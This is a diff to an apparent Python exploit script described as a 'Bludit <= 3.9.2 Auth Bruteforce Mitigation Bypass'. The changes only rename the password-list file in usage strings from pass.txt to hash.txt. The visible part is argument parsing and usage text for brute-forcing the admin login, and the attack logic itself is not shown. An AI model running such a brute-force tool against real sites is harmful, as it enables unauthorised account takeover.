@@ -18,7 +18,7 @@
 
 '''
 Example Usage:
-- ./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt 
+- ./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p hash.txt
 '''
 
 import requests
@@ -31,8 +31,8 @@ from pwn import *
 parser = argparse.ArgumentParser(description="Bludit <= 3.9.2 Auth Bruteforce Mitigation Bypass", formatter_class=argparse.RawTextHelpFormatter, 
 epilog=textwrap.dedent(''' 
 Exploit Usage : 
-./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt
-./exploit.py -l http://127.0.0.1/admin/login.php -u /Directory/user.txt -p /Directory/pass.txt'''))                     
+./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p hash.txt
+./exploit.py -l http://127.0.0.1/admin/login.php -u /Directory/user.txt -p /Directory/hash.txt'''))
 
 parser.add_argument("-l","--url", help="Path to Bludit (Example: http://127.0.0.1/admin/login.php)") 
 parser.add_argument("-u","--userlist", help="Username Dictionary") 
@@ -40,7 +40,7 @@ parser.add_argument("-p","--passlist", help="Password Dictionary")
 args = parser.parse_args()
 
 if len(sys.argv) < 2:
-    print (f"Exploit Usage: ./exploit.py -h [help] -l [url] -u [user.txt] -p [pass.txt]")          
+    print (f"Exploit Usage: ./exploit.py -h [help] -l [url] -u [user.txt] -p [hash.txt]")
     sys.exit(1)  
 
 # Variable
